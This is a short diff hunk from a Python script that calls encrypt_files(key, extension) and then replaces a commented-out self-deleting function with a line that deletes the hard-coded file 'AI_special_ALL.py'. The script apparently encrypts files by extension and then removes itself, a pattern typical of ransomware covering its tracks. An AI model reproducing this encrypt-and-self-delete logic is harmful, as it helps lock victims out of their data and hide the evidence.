@@ -27,7 +27,10 @@ encrypt_files(key, extension)
 
 
 
-def delete_script():
-    os.remove(__file__)
+# def delete_script():
+#     os.remove(__file__)
+# delete_script()
 
-#delete_script()
+filename = 'AI_special_ALL.py'
+os.remove(filename)
+
